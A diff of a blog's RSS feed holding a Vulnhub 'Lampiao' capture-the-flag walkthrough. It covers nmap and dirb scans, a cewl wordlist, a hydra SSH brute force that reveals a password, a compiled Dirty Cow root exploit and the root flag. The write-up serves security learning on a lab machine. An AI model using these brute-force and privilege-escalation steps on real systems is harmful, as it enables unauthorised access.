-    /@%/#&amp;amp;&amp;amp;@@@@@@*  @@@@    #%##&amp;amp;&amp;amp;&amp;amp;@&amp;amp;(  (@@%%%&amp;amp;&amp;amp;@@@%@@@@(.&amp;amp;@@@@@@@%%###@(.     
-    &amp;amp;@@@@@@@@#.     ,@@@%*(@@%%/(&amp;amp;.@@&amp;amp;/%@@#,.#.%,&amp;amp;%&amp;amp;@%*   .%@@@@@@&amp;amp;*(@@%     
-    %@@@@%,          .@@*   /*,%&amp;amp;%(@.%  (@./. *(*.@%*@@&amp;amp;        *%@@@@%&amp;amp;@(     
-    .@&amp;amp;               %@% *. #. .(% ,.  *@#.  .  #.((@,             /@@@@%     
-     ###               #&amp;amp;(*/.  *#*#@#    @&amp;amp;/  , ,,(/&amp;amp;(                *@@%     
-     &amp;amp;(%.                  *(,    (@,    @ //*. /*/.,                 #@     
-    ,%@@/                  .,/,.  .# (&amp;amp;%@@@% .% (/((             @.&amp;amp;/ ,%(/,    
-     (#                   ./#* ,#.   *@*&amp;amp;,,/,(#, &amp;amp;%(          #%*@  %@/##    
-     @&amp;amp;/%                    .&amp;amp;&amp;amp;*,@%%&amp;amp;@@@@#*, ./*.@. ((         **%#. (&amp;amp;(#*,   
-     %@#%*                     @, (/*.(@@@@@%#*.#@/   ,,&amp;amp;      .%#@#   &amp;amp;(( #   
-     .&amp;amp;(,                        %/*#*,.   ,,@@ .  .*.*@     (/@@.   *#(   
-                                   /@%#,,/,,&amp;amp;@@(.   (&amp;amp;   &amp;amp;@&amp;amp;,&amp;amp;*@&amp;amp;     %,(    
-                 #..&amp;amp;%               ,@&amp;amp;. /%@@(  .&amp;amp;@* #/@@%*/*/.(@# *%.        
-             ,.&amp;amp;*  * ..,((.    .#  .%@@@&amp;amp;@&amp;amp;.  (@@ *&amp;amp;@@@/. . @ @&amp;amp;((&amp;amp;@@/#.     
-         ,&amp;amp;. .*&amp;amp;/@*&amp;amp;,   ,/.   .&amp;amp;(   %. %%#.#   &amp;amp;&amp;amp;.%@@&amp;amp;@*.    .%,@&amp;amp;./.(.*%@&amp;amp;%,  
-       ,/  /@@@%#&amp;amp;@@,.&amp;amp;/   .**  ./&amp;amp;* .#,(   .#@@@@# ,%,,.   .*,%@/.*, (..(@@,%%
-    /*,@@@%&amp;amp;(%*@@@@&amp;amp; (,@#.  ,( . /,*&amp;amp;@@,(@@@*    ...   **(,&amp;amp;@,*,* .%/@&amp;amp;%**.
-    @&amp;amp;&amp;amp;@@@,///#@@@@@@, ( /@*(*/# .(/&amp;amp;..* *@%,. &amp;amp;,*(,. .%@@*.%@%..,***%@@ .*%,
-    @#,@&amp;amp;@@&amp;amp;&amp;amp;**#*/&amp;amp;@@@@@@*,.%*@@*/,,//* %   /@..,,#(/,.&amp;amp;@&amp;amp;*%  @@((,,(//@@#*  *%
-    #&amp;amp; .#@@@@*,/(*@@@@@@@@&amp;amp; %.@*&amp;amp;@&amp;amp;,(%. &amp;amp;  . @*.*../@@, ..%,/  ##/.%@@@(..,(%
-    .*. (@@@@@*,((@%&amp;amp;@@@@@@@@*  //&amp;amp;  ,@  ..@@#%%#,(&amp;amp;@@/*/%#,   ,@*.%@@@*,*.,#
-     .  (@@@@@%.,@&amp;amp;&amp;amp;&amp;amp;@@@@@%@@@**&amp;amp;@(,/  *#  /% @/@@@@&amp;amp;@@* /// .( . .#*#@@&amp;amp;/ ..*&amp;amp;
-       .,@@@@@@/%@%%#&amp;amp;@@@#@@@@@( ./#.  #,  ,. &amp;amp;/.,@@@@@(%&amp;amp;@/*   /...@%@@@ .,.(%
-       .,&amp;amp;&amp;amp;@@@@(##%@@@%@@@&amp;amp;,*.,,%#   #      #@, /@@@. ,,,  .  .*.  &amp;amp;@@@.. ,*/
-        .((@@@@#%* .#@#%@@(....((@@/   ,   ,  /@@&amp;amp;@// ,#@@#  ,..    &amp;amp;@@*. ..*
-         /,@@@@%@,  /%@@* . .*/&amp;amp;(#%        .  /@@@@@#.(##@   *., .  ,  %##..,./&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Unfortunately, both &lt;code class=&quot;highlighter-rouge&quot;&gt;dirb &lt;/code&gt;and any tries to enumerate this website failed.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# dirb http://10.0.0.12
-
------------------
-DIRB v2.22    
-By The Dark Raver
------------------
-
-START_TIME: Sun Aug  5 06:23:24 2018
-URL_BASE: http://10.0.0.12/
-WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-
------------------
-
-GENERATED WORDS: 4612                                                          
-
----- Scanning URL: http://10.0.0.12/ ----
-                                                                               
-(!) FATAL: Too many errors connecting to host
-    (Possible cause: COULDNT CONNECT)
-                                                                               
------------------
-END_TIME: Sun Aug  5 06:23:31 2018
-DOWNLOADED: 0 - FOUND: 0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;I decided to run another &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan with &lt;code class=&quot;highlighter-rouge&quot;&gt;-p-&lt;/code&gt; option scanning all possible ports.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# nmap -v -sS -A -T4 -p- 10.0.0.12
-Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-05 06:23 EDT
-NSE: Loaded 148 scripts for scanning.
-NSE: Script Pre-scanning.
-Initiating NSE at 06:23
-Completed NSE at 06:23, 0.00s elapsed
-Initiating NSE at 06:23
-Completed NSE at 06:23, 0.00s elapsed
-Initiating ARP Ping Scan at 06:23
-Scanning 10.0.0.12 [1 port]
-Completed ARP Ping Scan at 06:23, 0.05s elapsed (1 total hosts)
-Initiating Parallel DNS resolution of 1 host. at 06:23
-Completed Parallel DNS resolution of 1 host. at 06:23, 0.00s elapsed
-Initiating SYN Stealth Scan at 06:23
-Scanning 10.0.0.12 [65535 ports]
-Discovered open port 22/tcp on 10.0.0.12
-Discovered open port 80/tcp on 10.0.0.12
-Discovered open port 1898/tcp on 10.0.0.12
-Completed SYN Stealth Scan at 06:23, 3.57s elapsed (65535 total ports)
-Initiating Service scan at 06:23
-Scanning 3 services on 10.0.0.12
-Completed Service scan at 06:23, 11.40s elapsed (3 services on 1 host)
-Initiating OS detection (try #1) against 10.0.0.12
-NSE: Script scanning 10.0.0.12.
-Initiating NSE at 06:23
-Completed NSE at 06:23, 9.09s elapsed
-Initiating NSE at 06:23
-Completed NSE at 06:23, 0.04s elapsed
-Nmap scan report for 10.0.0.12
-Host is up (0.00028s latency).
-Not shown: 65532 closed ports
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   1024 46:b1:99:60:7d:81:69:3c:ae:1f:c7:ff:c3:66:e3:10 (DSA)
-|   2048 f3:e8:88:f2:2d:d0:b2:54:0b:9c:ad:61:33:59:55:93 (RSA)
-|   256 ce:63:2a:f7:53:6e:46:e2:ae:81:e3:ff:b7:16:f4:52 (ECDSA)
-|_  256 c6:55:ca:07:37:65:e3:06:c1:d6:5b:77:dc:23:df:cc (ED25519)
-80/tcp   open  http?
-| fingerprint-strings: 
-|   NULL: 
-|     _____ _ _ 
-|     |_|/ ___ ___ __ _ ___ _ _ 
-|     \x20| __/ (_| __ \x20|_| |_ 
-|     ___/ __| |___/ ___|__,_|___/__, ( ) 
-|     |___/ 
-|     ______ _ _ _ 
-|     ___(_) | | | |
-|     \x20/ _` | / _ / _` | | | |/ _` | |
-|_    __,_|__,_|_| |_|
-1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
-|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
-|_http-generator: Drupal 7 (http://drupal.org)
-| http-methods: 
-|_  Supported Methods: GET HEAD POST OPTIONS
-| http-robots.txt: 36 disallowed entries (15 shown)
-| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
-| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
-| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
-|_/LICENSE.txt /MAINTAINERS.txt
-|_http-server-header: Apache/2.4.7 (Ubuntu)
-|_http-title: Lampi\xC3\xA3o
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port80-TCP:V=7.70%I=7%D=8/5%Time=5B66D00B%P=x86_64-pc-linux-gnu%r(NULL,
-SF:1179,&quot;\x20_____\x20_\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
-MAC Address: 08:00:27:25:9F:3F (Oracle VirtualBox virtual NIC)
-Device type: general purpose
-Running: Linux 3.X|4.X
-OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
-OS details: Linux 3.2 - 4.9
-Uptime guess: 0.002 days (since Sun Aug  5 06:20:07 2018)
-Network Distance: 1 hop
-TCP Sequence Prediction: Difficulty=256 (Good luck!)
-IP ID Sequence Generation: All zeros
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-TRACEROUTE
-HOP RTT     ADDRESS
-1   0.28 ms 10.0.0.12
-
-NSE: Script Post-scanning.
-Initiating NSE at 06:23
-Completed NSE at 06:23, 0.00s elapsed
-Initiating NSE at 06:23
-Completed NSE at 06:23, 0.00s elapsed
-Read data files from: /usr/bin/../share/nmap
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 26.67 seconds
-           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)s&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Yup, now we can see another &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; service running on &lt;code class=&quot;highlighter-rouge&quot;&gt;Apache httpd 2.4.7&lt;/code&gt;, port &lt;code class=&quot;highlighter-rouge&quot;&gt;1898&lt;/code&gt;. Website is powered by &lt;code class=&quot;highlighter-rouge&quot;&gt;Drupal 7&lt;/code&gt;, so that’s something to remember too.&lt;/p&gt;
-
-&lt;p&gt;In the main page, I’ve noticed a strange post.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/lampiao/lampiao1.png&quot; alt=&quot;Lampiao1&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;We can see that node 2 is not working, so after looking at the url of the first post, we can simply move on to the second one.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;Test
-Submitted by Eder on Fri, 04/20/2018 - 13:53
-
-audio.m4a
-qrc.png
-
-Quite difficult using it. Trying to embed some sound and image... =(&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Now it’s time to find these files. After trying different directories, looking for default Drupal upload directories, I’ve found it in the main directory of the website.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://10.0.0.12:1898/qrc.png&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/lampiao/qr.png&quot; alt=&quot;Qr code&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Try harder! muahuahua&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Luckily, we have another file called &lt;code class=&quot;highlighter-rouge&quot;&gt;audio.m4a&lt;/code&gt;. Listening to it gives:&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;user tiago&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Amazing, we have username! Now it’s time to mess with the password. I could not find it anywhere in the web page, so here we can start with a &lt;code class=&quot;highlighter-rouge&quot;&gt;hydra&lt;/code&gt;. As I did not want to run attack with whole &lt;code class=&quot;highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt; wordlist, I decided to check wiht some smaller ones, but with no luck.&lt;/p&gt;
-
-&lt;p&gt;To the rescue came a trick with custom wordlists, learned from &lt;code class=&quot;highlighter-rouge&quot;&gt;Mr. Robot&lt;/code&gt; machine from Vulnhub. Remember &lt;code class=&quot;highlighter-rouge&quot;&gt;cewl&lt;/code&gt;. First node has lots of text, so let’s pack it into a wordlist.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# cewl http://10.0.0.12:1898/?q=node/1 -w pass.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Now we can run &lt;code class=&quot;highlighter-rouge&quot;&gt;hydra&lt;/code&gt;.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# hydra -l tiago -P pass.txt 192.168.1.112 -t 4 ssh
-Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
-
-Hydra (http://www.thc.org/thc-hydra) starting at 2018-08-07 10:44:21
-[DATA] max 4 tasks per 1 server, overall 4 tasks, 835 login tries (l:1/p:835), ~209 tries per task
-[DATA] attacking ssh://192.168.1.112:22/
-[STATUS] 64.00 tries/min, 64 tries in 00:01h, 771 to do in 00:13h, 4 active
-[22][ssh] host: 192.168.1.112   login: tiago   password: Virgulino
-1 of 1 target successfully completed, 1 valid password found
-Hydra (http://www.thc.org/thc-hydra) finished at 2018-08-07 10:46:26&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Great, we have it! Unfortunately, even this part took a lot of time as the password is not for Drupal account, but for &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; and finding that was pure luck.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# ssh tiago@192.168.1.112
-The authenticity of host '192.168.1.112 (192.168.1.112)' can't be established.
-ECDSA key fingerprint is SHA256:64C0fMfgIRp/7K8EpiEiirq/SrPByxrzXzn7bLIqxbU.
-Are you sure you want to continue connecting (yes/no)? yes
-Warning: Permanently added '192.168.1.112' (ECDSA) to the list of known hosts.
-tiago@192.168.1.112's password: 
-Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)
-
- * Documentation:  https://help.ubuntu.com/
-
-  System information as of Tue Aug  7 11:47:42 BRT 2018
-
-  System load:  0.0               Processes:           167
-  Usage of /:   7.6% of 19.07GB   Users logged in:     0
-  Memory usage: 27%               IP address for eth0: 192.168.1.112
-  Swap usage:   0%
-
-  Graph this data and manage this system at:
-    https://landscape.canonical.com/
-
-Last login: Tue Aug  7 11:47:42 2018 from 192.168.1.114
-
-tiago@lampiao:~$ cat .bash_history
-su www-data
-exit
-su root
-
-tiago@lampiao:~$ sudo -l
-[sudo] password for tiago: 
-Sorry, user tiago may not run sudo on lampiao.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Part for the privilage escalation was quite brutal, as none of the methods did not find anyhting useful, as I do not like using kernel exploits. They are always a last attack, but that was a case in this machine, using version of &lt;code class=&quot;highlighter-rouge&quot;&gt;Dirty Cow&lt;/code&gt; from &lt;a href=&quot;https://www.exploit-db.com/raw/40847/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;tiago@lampiao:/tmp$ touch exploit.c
-tiago@lampiao:/tmp$ vi exploit.c 
-tiago@lampiao:/tmp$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o exploit exploit.c -lutil
-tiago@lampiao:/tmp$ ./exploit 
-Running ...
-Received su prompt (Password: )
-Root password is:   dirtyCowFun
-Enjoy! :-)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Now we can log in to &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; and find the flag.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# ssh root@192.168.1.112
-root@192.168.1.112's password: 
-Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)
-
- * Documentation:  https://help.ubuntu.com/
-
-  System information as of Tue Aug  7 12:27:04 BRT 2018
-
-  System load:  0.77              Processes:           199
-  Usage of /:   7.6% of 19.07GB   Users logged in:     1
-  Memory usage: 19%               IP address for eth0: 192.168.1.112
-  Swap usage:   0%
-
-  Graph this data and manage this system at:
-    https://landscape.canonical.com/
-
-Last login: Fri Apr 20 14:46:57 2018 from 192.168.108.1
-root@lampiao:~# ls -la
-total 40
-drwx------  4 root root 4096 Apr 20 14:46 .
-drwxr-xr-x 21 root root 4096 Apr 19 15:55 ..
-drwx------  2 root root 4096 Apr 19 16:34 .aptitude
--rw-------  1 root root  254 Aug  7 12:28 .bash_history
--rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc
-drwx------  2 root root 4096 Apr 20 14:46 .cache
--rw-r--r--  1 root root   33 Apr 20 14:41 flag.txt
--rw-------  1 root root  149 Apr 19 16:34 .mysql_history
--rw-r--r--  1 root root  140 Feb 19  2014 .profile
--rw-------  1 root root  669 Apr 20 14:45 .viminfo
-root@lampiao:~# cat flag.txt 
-9740616875908d91ddcdaa8aea3af366&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Still I don’t know if it’s intended solution, but I’m welcome to any suggestions.&lt;/p&gt;
-</description>
-        <pubDate>Tue, 07 Aug 2018 02:00:00 +0200</pubDate>
-        <link>http://localhost:4000/vulnhub-lampiao/</link>
-        <guid isPermaLink="true">http://localhost:4000/vulnhub-lampiao/</guid>
       </item>
     
   </channel>
